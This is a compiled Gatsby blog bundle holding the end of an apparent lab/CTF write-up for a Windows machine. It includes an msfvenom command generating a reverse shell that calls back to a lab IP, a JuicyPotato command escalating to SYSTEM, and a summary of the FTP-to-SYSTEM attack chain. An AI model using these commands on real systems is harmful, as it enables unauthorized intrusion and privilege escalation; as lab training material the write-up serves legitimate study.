potato"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.230 LPORT=1234 -f exe > revshell2.exe\n")),"\n",a.createElement(n.ol,{start:"3"},"\n",a.createElement(n.li,null,"Upload the ",a.createElement(n.code,null,"revshell2.exe")," using admin FTP"),"\n",a.createElement(n.li,null,"Run JuicyPotato using the first CLSID found on the website"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,'Juicy.Potato.x86.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -l 1337 -p "C:\\wamp\\www\\revshell2.exe"\n')),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 15.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAlklEQVR42l2OaxKCMAyEexQVBEHpg5a2vERx1PufaE066jj++CbbTbaJ8HHFtDwxTHeE4QbfrxjnB7p4TX4kz4VL6lm/wHZnqHZ86wWB5lkfZUR16iD4wWHjZtRNoEZIAWkIPaDRPQ16ZIXGbq8SrPPSIP/xNlmDbS4hFAX5grSRaOkC/rioLMra4lA7qu4b/MDhf495Ac1mXmIMPqhsAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="run"\n        title=""\n        src="/static/d986f1e03e3e25f11032dff85b69563c/7d769/run.png"\n        srcset="/static/d986f1e03e3e25f11032dff85b69563c/5243c/run.png 240w,\n/static/d986f1e03e3e25f11032dff85b69563c/ab158/run.png 480w,\n/static/d986f1e03e3e25f11032dff85b69563c/7d769/run.png 960w,\n/static/d986f1e03e3e25f11032dff85b69563c/87339/run.png 1440w,\n/static/d986f1e03e3e25f11032dff85b69563c/f55c5/run.png 1694w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n","\n","\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 37.916666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABYlAAAWJQFJUiTwAAABOUlEQVR42p1R23KCMBTMj7QqiFQEgQAiEC5eW+tMO/3/j9mejeL42j6cSbJ7stmzUW4ywE+28HSNvBwQxhUWbxqOF2PqRpjN13AXCV6mAfwgFzyxOIs95LmfONIrZ3W+/KDfXdAOFxxOX+j3n3ZfmRN00UHnHfJNj7b/kHVArBukWWu5dVojyYzFMuE8X0N1vNycpI4YDleY7v1RlTnKA1ccz9/YVHsEUYlIJoiSCmneYrXeyr4W4QbLcGMdKzYW5Q4rac7ESbHdWSfEKHBz0VoXfpBhuSpEqLwJCk+cLj2JieMrOuFYsbwSa2NJCnMkZjdxwkdmvGAzu+c2u+MjZx0ayWbM4bYavM7CR4O7iK0wV57Hcp/KEX7EFZ0U8rupiHGMsj7YD3i+/JdSDJVBMxeGzIBLyfW/gr/34PleFGqLLAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="result"\n        title=""\n        src="/static/a29b3b8da21da124b884fd81148bc657/7d769/result.png"\n        srcset="/static/a29b3b8da21da124b884fd81148bc657/5243c/result.png 240w,\n/static/a29b3b8da21da124b884fd81148bc657/ab158/result.png 480w,\n/static/a29b3b8da21da124b884fd81148bc657/7d769/result.png 960w,\n/static/a29b3b8da21da124b884fd81148bc657/2b72d/result.png 980w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.p,null,"The command works and we have a shell as NT Authority\\System."),"\n",a.createElement(n.h1,null,"Summary"),"\n",a.createElement(n.p,null,"Reconnaissance:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"Conducted Nmap scan to identify open ports and services"),"\n",a.createElement(n.li,null,"Discovered an FTP server with anonymous login enabled"),"\n",a.createElement(n.li,null,"Used Ncrack to verify default credentials, gaining access to the FTP console"),"\n",a.createElement(n.li,null,"Obtained hashed passwords from the FTP server"),"\n"),"\n",a.createElement(n.p,null,"Initial Access:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"Cracked hashed passwords using John the Ripper"),"\n",a.createElement(n.li,null,"Accessed an HTTP service using compromised credentials"),"\n",a.createElement(n.li,null,"Utilized Gobuster to enumerate directories, discovering a potential upload functionality"),"\n"),"\n",a.createElement(n.p,null,"Exploitation:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"Uploaded a crafted reverse shell through FTP"),"\n",a.createElement(n.li,null,"Triggered the execution of the reverse shell via a PHP script on the HTTP server, gaining initial access to the system"),"\n"),"\n",a.createElement(n.p,null,"Privilege Escalation:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"Leveraged the SeImpersonatePrivilege privilege and system information obtained through enumeration"),"\n",a.createElement(n.li,null,"Exploited a known CLSID vulnerability using Juicy Potato"),"\n",a.createElement(n.li,null,"Executed Juicy Potato with the appropriate CLSID, resulting in escalated privileges to NT Authority\\System"),"\n"),"\n",a.createElement(n.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",a.createElement(n.p,null,"+20 points"))}var s=function(e){void 0===e&&(e={});const{wrapper:n}=Object.assign({},(0,l.ah)(),e.components);return n?a.createElement(n,e,a.createElement(i,e)):i(e)},r=t(4765);function c(e){return a.createElement(r.Z,e,a.createElement(s,e))}r.Z}}]);
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-authby-index-mdx-69d1775897edfa3cb431.js.map